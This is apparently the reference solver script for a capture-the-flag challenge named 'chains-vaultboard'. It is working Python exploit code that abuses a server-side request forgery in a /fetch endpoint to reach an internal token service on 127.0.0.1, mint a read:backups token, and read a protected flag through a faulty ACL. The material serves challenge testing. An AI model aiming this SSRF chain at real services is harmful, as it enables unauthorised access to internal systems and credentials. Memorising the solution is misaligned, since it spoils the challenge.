#!/usr/bin/env python3
"""Reference solver for chains-vaultboard.

SSRF the internal STS to mint a read:backups token, then read private/flag whose
ACL wrongly allows that scope.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request


def _get(url):
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    sts = _get(
        base + "/fetch?url=" + urllib.parse.quote("http://127.0.0.1/internal/sts")
    )
    token = sts["result"]["token"]
    return _get(base + "/object?key=private/flag&token=" + token)["body"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
